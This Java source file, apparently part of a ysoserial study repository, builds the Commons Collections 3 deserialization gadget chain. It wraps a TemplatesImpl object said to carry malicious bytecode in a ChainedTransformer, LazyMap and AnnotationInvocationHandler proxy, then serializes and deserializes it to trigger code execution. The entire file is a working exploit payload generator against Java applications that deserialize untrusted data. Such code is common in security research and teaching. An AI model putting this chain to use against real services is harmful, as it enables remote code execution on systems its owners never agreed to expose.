package org.su18.serialize.ysoserial.CommonCollections.CommonCollections3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
public class CC3 {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 结合 ChainedTransformer
		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
		});

		// 初始化 LazyMap
		Map            lazyMap     = LazyMap.decorate(new HashMap(), chain);
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
		InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
		// 创建LazyMap的动态代理类实例
		Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

		// 使用动态代理初始化 AnnotationInvocationHandler
		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);

		SerializeUtil.writeObjectToFile(invocationHandler);
		SerializeUtil.readFileObject();
	}

}
